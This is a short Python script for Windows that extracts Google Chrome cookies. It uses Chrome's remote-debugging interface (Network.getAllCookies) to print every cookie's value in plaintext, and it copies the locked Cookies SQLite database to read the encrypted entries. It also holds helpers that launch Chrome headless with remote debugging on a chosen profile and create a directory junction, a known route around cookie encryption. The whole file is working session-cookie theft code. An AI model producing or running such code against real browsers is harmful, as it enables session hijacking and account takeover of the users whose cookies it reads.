import winreg
import requests
import websocket
import json
import os
import subprocess
import sqlite3

DEBUG_PORT = 5000


def get_chrome_exe_path():
    paths_to_try = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
    ]

    for root, subkey in paths_to_try:
        try:
            with winreg.OpenKey(root, subkey) as key:
                value, _ = winreg.QueryValueEx(key, None)
                return value
        except FileNotFoundError:
            continue

    return None


def get_chrome_user_data_dir():
    local_app_data = os.environ.get("LOCALAPPDATA")
    if not local_app_data:
        return None

    return os.path.join(local_app_data, "Google", "Chrome", "User Data")


def get_chrome_cookies_path(profile="Default"):
    user_data_dir = get_chrome_user_data_dir()
    if not user_data_dir:
        return None

    return os.path.join(user_data_dir, profile, "Network", "Cookies")


def get_devtools_targets(debug_port):
    resp = requests.get(f"http://localhost:{debug_port}/json")
    return resp.json()


def connect_websocket(ws_url):
    return websocket.create_connection(ws_url)


def fetch_cookies_via_devtools(ws):
    msg_id = 1

    ws.send(json.dumps({
        "id": msg_id,
        "method": "Network.getAllCookies"
    }))

    while True:
        response = json.loads(ws.recv())
        if response.get("id") == msg_id:
            return response["result"]["cookies"]


def print_cookies(cookies):
    for c in cookies:
        print(f"{c['domain']} | {c['name']} = {c['value']}")
    print(f"\nCollected {len(cookies)} cookies")


def start_chrome_debug(chrome_path, user_data_dir):
    subprocess.Popen([
        chrome_path,
        f"--remote-debugging-port={DEBUG_PORT}",
        f"--user-data-dir={user_data_dir}",
        "--headless",
        f"--remote-allow-origin={DEBUG_PORT}",
    ])


def create_junction(src, dst):
    if os.path.exists(dst):
        return

    cmd = f'mklink /J "{dst}" "{src}"'
    subprocess.run(cmd, shell=True, check=True)


def read_cookies_from_db(db_path):
    if not os.path.exists(db_path):
        raise FileNotFoundError("Cookies DB not found")

    # Chrome locks the DB → copy first
    temp_path = db_path + "_copy"
    with open(db_path, "rb") as src, open(temp_path, "wb") as dst:
        dst.write(src.read())

    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT host_key, name, path, encrypted_value, expires_utc
        FROM cookies
    """)

    cookies = []
    for row in cursor.fetchall():
        cookie = {
            "domain": row[0],
            "name": row[1],
            "path": row[2],
            "encrypted_value": row[3],
            "expires": row[4]
        }
        cookies.append(cookie)

    conn.close()
    os.remove(temp_path)

    return cookies


def print_db_cookies(cookies):
    for c in cookies:
        print(f"{c['domain']} | {c['name']} = <encrypted {len(c['encrypted_value'])} bytes>")
    print(f"\nLoaded {len(cookies)} cookies from DB")


def main():
    chrome_path = get_chrome_exe_path()
    print("Chrome EXE:", chrome_path)

    cookies_path = get_chrome_cookies_path()
    print("Cookies path:", cookies_path)

    try:
        targets = get_devtools_targets(DEBUG_PORT)
        if not targets:
            raise Exception("No targets found")

        ws_url = targets[0]["webSocketDebuggerUrl"]
        print("Connecting to:", ws_url)

        ws = connect_websocket(ws_url)
        cookies = fetch_cookies_via_devtools(ws)

        print("\n[DevTools Cookies]")
        print_cookies(cookies)

        ws.close()

    except Exception as e:
        print("DevTools method failed:", e)

    try:
        db_cookies = read_cookies_from_db(cookies_path)

        print("\n[SQLite Cookies - Encrypted]")
        print_db_cookies(db_cookies)

    except Exception as e:
        print("SQLite method failed:", e)


if __name__ == "__main__":
    main()